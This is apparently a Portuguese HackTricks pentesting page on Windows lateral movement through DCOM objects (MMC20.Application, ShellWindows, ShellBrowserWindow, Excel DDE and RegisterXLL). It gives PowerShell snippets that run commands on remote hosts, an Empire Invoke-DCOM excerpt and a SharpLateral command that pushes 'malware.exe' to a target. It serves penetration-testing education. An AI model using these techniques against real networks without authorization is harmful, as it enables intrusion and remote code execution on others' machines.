# Execução DCOM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rapidamente. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

Objetos **DCOM** (Distributed Component Object Model) são **interessantes** devido à capacidade de **interagir** com os objetos **pela rede**. A Microsoft tem uma boa documentação sobre DCOM [aqui](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e sobre COM [aqui](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Você pode encontrar uma lista sólida de aplicações DCOM usando PowerShell, executando `Get-CimInstance Win32_DCOMApplication`.

O objeto COM [Classe de Aplicação MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) permite que você crie scripts para componentes de operações de snap-in do MMC. Ao enumerar os diferentes métodos e propriedades dentro deste objeto COM, notei que há um método chamado `ExecuteShellCommand` em Document.ActiveView.

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

Você pode ler mais sobre esse método [aqui](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Até agora, temos uma aplicação DCOM que podemos acessar pela rede e executar comandos. A peça final é aproveitar esta aplicação DCOM e o método ExecuteShellCommand para obter execução de código em um host remoto.

Felizmente, como administrador, você pode interagir remotamente com DCOM com PowerShell usando "`[activator]::CreateInstance([type]::GetTypeFromProgID`". Tudo o que você precisa fazer é fornecer um DCOM ProgID e um endereço IP. Em seguida, ele fornecerá uma instância desse objeto COM remotamente:

![](<../../.gitbook/assets/image (665).png>)

Então é possível invocar o método `ExecuteShellCommand` para iniciar um processo no host remoto:

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

O objeto **MMC20.Application** não tinha "[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)" explícitas, resultando no conjunto de permissões padrão que permite acesso aos Administradores:

![](<../../.gitbook/assets/image (4) (1) (2).png>)

Você pode ler mais sobre esse tópico [aqui](https://twitter.com/tiraniddo/status/817532039771525120).\
Ver quais outros objetos que não têm LaunchPermission explícita pode ser feito usando o [OleView .NET](https://github.com/tyranid/oleviewdotnet) de [@tiraniddo](https://twitter.com/tiraniddo), que possui excelentes filtros Python (entre outras coisas). Neste caso, podemos filtrar todos os objetos que não têm Launch Permission explícita. Ao fazer isso, dois objetos se destacaram para mim: `ShellBrowserWindow` e `ShellWindows`:

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

Outra maneira de identificar objetos-alvo potenciais é procurar pelo valor `LaunchPermission` ausente nas chaves em `HKCR:\AppID\{guid}`. Um objeto com Launch Permissions definidas aparecerá como abaixo, com dados representando a ACL do objeto em formato binário:

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

Aqueles sem LaunchPermission explícita estarão faltando essa entrada específica no registro.

### ShellWindows

O primeiro objeto explorado foi [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx). Como não há [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) associado a este objeto, podemos usar o método .NET [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) emparelhado com o método [Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) para instanciar o objeto através de seu AppID em um host remoto. Para fazer isso, precisamos obter o [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) para o objeto ShellWindows, o que pode ser feito usando o OleView .NET também:

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

Como você pode ver abaixo, o campo "Launch Permission" está em branco, o que significa que nenhuma permissão explícita está definida.

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

Agora que temos o CLSID, podemos instanciar o objeto em um alvo remoto:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote_instantiation_shellwindows.png?w=690&h=354)

Com o objeto instanciado no host remoto, podemos interagir com ele e invocar quaisquer métodos que quisermos. O handle retornado para o objeto revela vários métodos e propriedades, com os quais não podemos interagir. Para alcançar uma interação real com o host remoto, precisamos acessar o método [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx), que nos devolverá um objeto que representa a janela do shell do Windows:
```
$item = $obj.Item()
```
```markdown
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

Com um controle total sobre a Janela Shell, agora podemos acessar todos os métodos/propriedades esperados que são expostos. Após analisar esses métodos, **`Document.Application.ShellExecute`** se destacou. Certifique-se de seguir os requisitos de parâmetros para o método, que estão documentados [aqui](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745(v=vs.85).aspx).
```
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
Como você pode ver acima, nosso comando foi executado com sucesso em um host remoto.

### ShellBrowserWindow

Este objeto específico não existe no Windows 7, o que torna seu uso para movimento lateral um pouco mais limitado do que o objeto "ShellWindows", que eu testei com sucesso no Win7-Win10.

Com base na minha enumeração deste objeto, parece fornecer efetivamente uma interface para a janela do Explorer, assim como o objeto anterior. Para instanciar este objeto, precisamos obter seu CLSID. Semelhante ao acima, podemos usar OleView .NET:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

Novamente, observe o campo de Permissão de Lançamento em branco:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

Com o CLSID, podemos repetir os passos dados no objeto anterior para instanciar o objeto e chamar o mesmo método:
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
Como você pode ver, o comando foi executado com sucesso no alvo remoto.

Uma vez que este objeto interage diretamente com o shell do Windows, não precisamos invocar o método "ShellWindows.Item", como no objeto anterior.

Embora esses dois objetos DCOM possam ser usados para executar comandos shell em um host remoto, existem muitos outros métodos interessantes que podem ser usados para enumerar ou manipular um alvo remoto. Alguns desses métodos incluem:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

De maneira semelhante, é possível mover-se lateralmente abusando de objetos DCOM do Excel, para mais informações leia [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## Ferramentas Automáticas

* O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as formas comentadas de executar código em outras máquinas.
* Você também pode usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referências

* O primeiro método foi copiado de [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), para mais informações siga o link
* A segunda seção foi copiada de [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/), para mais informações siga o link

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rápido. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cybersecurity**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
